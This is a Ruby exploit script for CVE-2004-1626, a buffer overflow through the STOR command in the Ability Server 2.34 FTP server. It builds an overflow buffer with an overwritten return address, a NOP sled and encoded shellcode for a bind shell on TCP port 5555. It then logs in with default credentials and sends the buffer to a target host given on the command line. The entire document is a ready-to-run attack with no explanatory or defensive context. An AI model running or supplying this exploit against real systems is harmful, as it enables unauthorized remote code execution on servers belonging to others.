#!/usr/bin/env ruby
#
# CVE-2004-1626 | ABILITY SERVER 2.34 STOR COMMAND
# KING SABRI | @KINGSABRI
#
require 'socket'
#7E429353
junk      = "A"*966
eip       = "\x53\x93\x42\x7E"
nop       = "\x90"*30
shellcode = "\xba\xb5\x79\xd9\xdd\xda\xda\xd9\x74\x24\xf4\x5e\x2b\xc9" +
"\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xe3\x77\x3b\x28\xf7" +
"\x60\x39\xd3\x07\x71\x5e\x5d\xe2\x40\x5e\x39\x67\xf2\x6e" +
"\x49\x25\xff\x05\x1f\xdd\x74\x6b\x88\xd2\x3d\xc6\xee\xdd" +
"\xbe\x7b\xd2\x7c\x3d\x86\x07\x5e\x7c\x49\x5a\x9f\xb9\xb4" +
"\x97\xcd\x12\xb2\x0a\xe1\x17\x8e\x96\x8a\x64\x1e\x9f\x6f" +
"\x3c\x21\x8e\x3e\x36\x78\x10\xc1\x9b\xf0\x19\xd9\xf8\x3d" +
"\xd3\x52\xca\xca\xe2\xb2\x02\x32\x48\xfb\xaa\xc1\x90\x3c" +
"\x0c\x3a\xe7\x34\x6e\xc7\xf0\x83\x0c\x13\x74\x17\xb6\xd0" +
"\x2e\xf3\x46\x34\xa8\x70\x44\xf1\xbe\xde\x49\x04\x12\x55" +
"\x75\x8d\x95\xb9\xff\xd5\xb1\x1d\x5b\x8d\xd8\x04\x01\x60" +
"\xe4\x56\xea\xdd\x40\x1d\x07\x09\xf9\x7c\x40\xfe\x30\x7e" +
"\x90\x68\x42\x0d\xa2\x37\xf8\x99\x8e\xb0\x26\x5e\xf0\xea" +
"\x9f\xf0\x0f\x15\xe0\xd9\xcb\x41\xb0\x71\xfd\xe9\x5b\x81" +
"\x02\x3c\xcb\xd1\xac\xef\xac\x81\x0c\x40\x45\xcb\x82\xbf" +
"\x75\xf4\x48\xa8\x1c\x0f\x1b\x17\x48\x6b\xd8\xff\x8b\x73" +
"\xcf\xa3\x02\x95\x85\x4b\x43\x0e\x32\xf5\xce\xc4\xa3\xfa" +
"\xc4\xa1\xe4\x71\xeb\x56\xaa\x71\x86\x44\x5b\x72\xdd\x36" +
"\xca\x8d\xcb\x5e\x90\x1c\x90\x9e\xdf\x3c\x0f\xc9\x88\xf3" +
"\x46\x9f\x24\xad\xf0\xbd\xb4\x2b\x3a\x05\x63\x88\xc5\x84" +
"\xe6\xb4\xe1\x96\x3e\x34\xae\xc2\xee\x63\x78\xbc\x48\xda" +
"\xca\x16\x03\xb1\x84\xfe\xd2\xf9\x16\x78\xdb\xd7\xe0\x64" +
"\x6a\x8e\xb4\x9b\x43\x46\x31\xe4\xb9\xf6\xbe\x3f\x7a\x06" +
"\xf5\x1d\x2b\x8f\x50\xf4\x69\xd2\x62\x23\xad\xeb\xe0\xc1" +
"\x4e\x08\xf8\xa0\x4b\x54\xbe\x59\x26\xc5\x2b\x5d\x95\xe6" +
"\x79"

rest = "\xcc"*(2000-(966+4+30+338))
exploit = junk + eip + nop + shellcode + rest

# Networking
if ARGV.size >= 1
  host = ARGV[0]
  port = ARGV[1] || 21
else
  puts "ruby #{__FILE__} <TARGET> <PORT>"
  exit
end

s = TCPSocket.open(host, port)
banner = s.recv(1024)
puts "[+] #{banner}"
puts " Sending Username"
s.send("USER ftp\r\n", 0)
banner = s.recv(1024)
puts "[+] #{banner}"
puts " Sending Password"
s.send("PASS ftp\r\n", 0)
banner = s.recv(1024)
puts "[+] #{banner}"
puts " Sending Evil buffer..."
s.send("STOR " + exploit + "\r\n", 0)
s.close

# Exploit Info
puts "[*] Exploit Info"
puts "[+] Exploit size: #{exploit.size} bytes."
puts "[+] Shellcode Type: Bind tcp/5555"
puts "[+] Done!"
